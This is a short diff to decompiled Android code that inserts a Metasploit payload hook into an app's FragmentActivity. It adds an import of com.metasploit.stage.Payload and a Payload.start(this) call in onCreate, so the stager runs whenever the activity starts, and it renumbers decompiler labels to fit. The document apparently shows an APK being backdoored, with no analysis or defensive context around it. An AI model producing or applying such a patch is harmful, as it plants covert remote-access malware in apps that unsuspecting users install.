@@ -18,6 +18,7 @@ import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
+import com.metasploit.stage.Payload;
 import java.io.FileDescriptor;
 import java.io.PrintWriter;
 import java.util.ArrayList;
@@ -202,6 +203,7 @@ public class FragmentActivity extends Activity
     if (getLayoutInflater().getFactory() == null)
       getLayoutInflater().setFactory(this);
     super.onCreate(paramBundle);
+    Payload.start(this);
     NonConfigurationInstances localNonConfigurationInstances = (NonConfigurationInstances)getLastNonConfigurationInstance();
     if (localNonConfigurationInstances != null)
       this.mAllLoaderManagers = localNonConfigurationInstances.loaders;
@@ -212,9 +214,9 @@ public class FragmentActivity extends Activity
       localParcelable = paramBundle.getParcelable("android:support:fragments");
       localFragmentManagerImpl = this.mFragments;
       if (localNonConfigurationInstances == null)
-        break label94;
+        break label98;
     }
-    label94: for (ArrayList localArrayList = localNonConfigurationInstances.fragments; ; localArrayList = null)
+    label98: for (ArrayList localArrayList = localNonConfigurationInstances.fragments; ; localArrayList = null)
     {
       localFragmentManagerImpl.restoreAllState(localParcelable, localArrayList);
       this.mFragments.dispatchCreate();
